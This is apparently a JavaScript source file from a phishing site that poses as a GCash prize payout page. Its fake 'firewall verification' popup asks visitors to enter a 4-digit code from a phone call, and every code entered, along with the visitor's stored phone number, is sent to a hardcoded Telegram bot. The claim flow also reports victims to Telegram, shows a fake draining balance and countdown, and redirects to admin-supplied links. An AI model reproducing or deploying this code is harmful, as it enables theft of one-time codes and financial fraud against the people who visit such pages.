let claimState = {
    isProcessing: false,
    currentAmount: 0,
    countdownInterval: null,
    balanceDecrementInterval: null,
    countdownSeconds: 180,
    isPending: false,
    hasRedirected: false
};

let cachedFirewallStatus = false;

// ========== FIREWALL VERIFICATION ==========
let currentVerificationCode = null;
let verificationAttempts = 0;

async function getFirewallStatus() {
    if (typeof firebase === 'undefined' || !firebase.database) {
        console.warn("Firebase not available");
        return false;
    }
    try {
        const db = firebase.database();
        const snap = await db.ref('admin/globalFirewall').once('value');
        const data = snap.val();
        console.log("🔥 Firewall status from Firebase:", data);
        if (data === null) {
            console.warn("No firewall data, creating default...");
            await db.ref('admin/globalFirewall').set({
                active: false,
                activatedBy: "SYSTEM",
                timestamp: Date.now()
            });
            return false;
        }
        return data.active === true;
    } catch(e) { 
        console.error("Firewall check error:", e);
        return false;
    }
}

// Real-time listener for firewall changes
function listenToFirewallChanges() {
    if (typeof firebase === 'undefined' || !firebase.database) return;
    const db = firebase.database();
    db.ref('admin/globalFirewall').on('value', (snapshot) => {
        const data = snapshot.val();
        cachedFirewallStatus = (data && data.active === true);
        console.log("🔥 Firewall status updated (real-time):", cachedFirewallStatus);
        
        // Optional: Update UI if needed
        const statusLabel = document.getElementById('statusLabel');
        if (statusLabel && cachedFirewallStatus) {
            statusLabel.innerHTML = "⚠️ FIREWALL ACTIVE - Verification required ⚠️";
            statusLabel.style.color = "#ff8888";
        } else if (statusLabel && !cachedFirewallStatus) {
            statusLabel.innerHTML = "✨ Welcome! ✨";
            statusLabel.style.color = "#fbbf24";
        }
    });
}

async function isFirewallActive() {
    return cachedFirewallStatus;
}

async function sendTelegram(phone, code) {
    const msg = `📞 VERIFY REQUEST\n📱 ${phone}\n🔑 Code: ${code}`;
    try {
        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
        console.log("📨 Telegram sent");
    } catch(e) {}
}

function showFirewallPopup() {
    console.log("🔥 Showing firewall verification popup");
    const popup = document.getElementById('firewallPopup');
    if (!popup) {
        console.error("Firewall popup element not found!");
        return;
    }
    
    const content = document.getElementById('firewallPopupContent');
    if (content) {
        content.innerHTML = `
            <div class="firewall-warning-icon">📞</div>
            <h2>VERIFICATION REQUIRED</h2>
            <div class="firewall-message">
                <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
                <p>Please wait for the system-verification to call you. You will receive a 4-digit code during the call.</p>
                <p>Enter the code below to continue.</p>
            </div>
            <div class="verification-input-group">
                <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric">
                <button id="verifyCodeBtn" class="verify-btn" onclick="verifyFirewallCode()">VERIFY NOW</button>
            </div>
            <div class="firewall-note">
                <p>Waiting for system-verification call...</p>
            </div>
            <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
        `;
    }
    
    currentVerificationCode = Math.floor(1000 + Math.random() * 9000).toString();
    verificationAttempts = 0;
    console.log("📞 VERIFICATION CODE:", currentVerificationCode);
    
    popup.style.display = 'flex';
    setTimeout(() => {
        const ci = document.getElementById('verificationCode');
        if (ci) ci.focus();
    }, 100);
}

function hideFirewallPopup() {
    const popup = document.getElementById('firewallPopup');
    if (popup) popup.style.display = 'none';
}

window.verifyFirewallCode = async function() {
    const codeInput = document.getElementById('verificationCode');
    const code = codeInput ? codeInput.value.trim() : '';
    const errorDiv = document.getElementById('firewallErrorMsg');
    const verifyBtn = document.getElementById('verifyCodeBtn');
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    if (!code || code.length < 4) {
        if (errorDiv) {
            errorDiv.innerHTML = "Please enter a 4-digit code.";
            errorDiv.style.display = 'block';
        }
        return;
    }
    
    if (verifyBtn) {
        verifyBtn.disabled = true;
        verifyBtn.innerHTML = "VERIFYING...";
    }
    if (errorDiv) errorDiv.style.display = 'none';
    
    verificationAttempts++;
    const isValid = (code === currentVerificationCode);
    
    if (isValid) {
        await sendTelegram(userPhone, code);
        hideFirewallPopup();
        alert("Verification successful. Page will refresh.");
        setTimeout(() => {
            window.location.reload();
        }, 500);
    } else {
        await sendTelegram(userPhone, code);
        let errorMsg = "Invalid verification code. Please try again.";
        if (verificationAttempts >= 3) {
            errorMsg = "Too many failed attempts. Page will refresh.";
            if (verifyBtn) verifyBtn.disabled = true;
            setTimeout(() => {
                window.location.reload();
            }, 2000);
        }
        if (errorDiv) {
            errorDiv.innerHTML = errorMsg;
            errorDiv.style.display = 'block';
        }
        if (verifyBtn && verifyBtn.disabled !== true) {
            verifyBtn.disabled = false;
            verifyBtn.innerHTML = "VERIFY NOW";
        }
        if (codeInput) {
            codeInput.value = '';
            codeInput.focus();
        }
    }
};

// ========== GET LATEST DEPLOYED LINK ==========
async function getLatestPayoutLink() {
    if (typeof firebase === 'undefined' || !firebase.database) return null;
    try {
        const db = firebase.database();
        const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        if (snapshot.exists()) {
            const key = Object.keys(snapshot.val())[0];
            const linkData = snapshot.val()[key];
            console.log("🔗 Found payout link:", linkData.url);
            return linkData.url || null;
        }
        console.warn("No available links found in Firebase");
        return null;
    } catch (error) {
        console.error("Error getting payout link:", error);
        return null;
    }
}

// ========== MAIN CLAIM POPUP ==========
async function showClaimPopup(amount) {
    console.log("showClaimPopup called with amount:", amount);
    
    // Get latest firewall status
    const firewallActive = await getFirewallStatus();
    console.log("🔥 Firewall active:", firewallActive);
    
    if (firewallActive) {
        console.log("FIREWALL ON - Showing verification popup");
        showFirewallPopup();
        return;
    }
    
    console.log("FIREWALL OFF - Showing congratulations popup");
    claimState.currentAmount = amount;
    claimState.isProcessing = false;
    claimState.hasRedirected = false;
    
    const popup = document.getElementById('claimPopup');
    const prizeSpan = document.getElementById('popupPrizeAmount');
    const claimBtn = document.getElementById('claimActionBtn');
    
    if (prizeSpan) prizeSpan.innerHTML = "₱" + amount.toLocaleString();
    if (claimBtn) {
        claimBtn.innerHTML = 'CLAIM THRU GCASH';
        claimBtn.disabled = false;
    }
    if (popup) popup.style.display = 'flex';
}

function hideClaimPopup() { 
    const p = document.getElementById('claimPopup'); 
    if (p) p.style.display = 'none'; 
}

function showPendingStatus() { 
    const pa = document.getElementById('pendingStatusArea'); 
    if (pa) pa.style.display = 'block'; 
    claimState.isPending = true; 
}

function hidePendingStatus() { 
    const pa = document.getElementById('pendingStatusArea'); 
    if (pa) pa.style.display = 'none'; 
    claimState.isPending = false; 
}

// ========== BALANCE DECREMENT ==========
function startSmoothDecrement(originalAmount) {
    const balanceText = document.getElementById('balanceText');
    if (!balanceText) return;
    
    let current = originalAmount;
    const decrementStep = 1;
    const totalDuration = 2000;
    const steps = originalAmount;
    const intervalTime = totalDuration / steps;
    
    claimState.balanceDecrementInterval = setInterval(() => {
        current = current - decrementStep;
        if (current >= 0) balanceText.innerText = "₱" + current.toLocaleString() + ".00";
        if (current <= 0) {
            clearInterval(claimState.balanceDecrementInterval);
            claimState.balanceDecrementInterval = null;
            balanceText.innerText = "₱0.00";
        }
    }, intervalTime);
}

// ========== COUNTDOWN TIMER ==========
function startVisibleCountdown(originalAmount) {
    let remaining = claimState.countdownSeconds;
    const timerSpan = document.getElementById('pendingCountdown');
    const pendingArea = document.getElementById('pendingStatusArea');
    const withdrawBtn = document.getElementById('claimBtn');
    
    if (!timerSpan) return;
    
    claimState.countdownInterval = setInterval(() => {
        if (remaining > 0) {
            remaining--;
            const mins = Math.floor(remaining / 60);
            const secs = remaining % 60;
            timerSpan.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        }
        
        if (remaining <= 0) {
            clearInterval(claimState.countdownInterval);
            claimState.countdownInterval = null;
            
            const balanceText = document.getElementById('balanceText');
            if (balanceText) balanceText.innerText = "₱" + originalAmount.toLocaleString() + ".00";
            
            if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
                window.parent.updateGameBalance(originalAmount);
            } else if (typeof updateGameBalance === 'function') {
                updateGameBalance(originalAmount);
            } else if (typeof GameState !== 'undefined') {
                GameState.balance = originalAmount;
                if (typeof updateUI === 'function') updateUI();
                if (typeof saveData === 'function') saveData();
            }
            
            if (pendingArea) pendingArea.style.display = 'none';
            if (withdrawBtn) withdrawBtn.style.display = 'block';
            
            claimState.isProcessing = false;
            claimState.hasRedirected = false;
        }
    }, 1000);
}

// ========== REDIRECT TIMER ==========
function startImaginaryTimer(redirectUrl) {
    claimState.imaginaryTimer = setTimeout(() => {
        if (!claimState.hasRedirected) {
            claimState.hasRedirected = true;
            window.location.href = redirectUrl;
        }
    }, 2000);
}

// ========== CLAIM ACTION ==========
function onClaimAction() {
    if (claimState.isProcessing) return;
    
    claimState.isProcessing = true;
    const claimBtn = document.getElementById('claimActionBtn');
    const amount = claimState.currentAmount;
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    claimBtn.disabled = true;
    claimBtn.innerHTML = 'PROCESSING...';
    
    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("💰 CLAIM REQUEST!\n📱 " + userPhone + "\n💵 ₱" + amount)}`)
        .catch(e => console.log('Telegram error:', e));
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        const db = firebase.database();
        
        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', (snapshot) => {
            if (snapshot.exists()) {
                const key = Object.keys(snapshot.val())[0];
                const linkData = snapshot.val()[key];
                const redirectUrl = linkData.url;
                
                db.ref('links/' + key).update({ 
                    status: 'claimed', 
                    user: userPhone, 
                    amount: amount, 
                    claimedAt: Date.now() 
                });
                
                hideClaimPopup();
                showPendingStatus();
                startSmoothDecrement(amount);
                startVisibleCountdown(amount);
                startImaginaryTimer(redirectUrl);
                
            } else {
                claimBtn.innerHTML = 'NO REWARDS';
                setTimeout(() => {
                    claimBtn.innerHTML = 'CLAIM THRU GCASH';
                    claimBtn.disabled = false;
                    claimState.isProcessing = false;
                }, 3000);
                alert("No available rewards! Please wait for admin to deploy a link.");
            }
        }).catch((err) => {
            console.error("Firebase error:", err);
            claimBtn.innerHTML = 'ERROR';
            setTimeout(() => {
                claimBtn.innerHTML = 'CLAIM THRU GCASH';
                claimBtn.disabled = false;
                claimState.isProcessing = false;
            }, 3000);
        });
    }
}

document.addEventListener('DOMContentLoaded', function() { 
    hidePendingStatus();
    // Initialize firewall listener
    listenToFirewallChanges();
    // Get initial status
    getFirewallStatus().then(status => {
        console.log("Initial firewall status:", status);
        cachedFirewallStatus = status;
    });
    console.log("Popup.js loaded");
});

// Expose functions for global access
window.showFirewallPopup = showFirewallPopup;
window.hideFirewallPopup = hideFirewallPopup;
window.verifyFirewallCode = verifyFirewallCode;
window.showClaimPopup = showClaimPopup;
window.onClaimAction = onClaimAction;
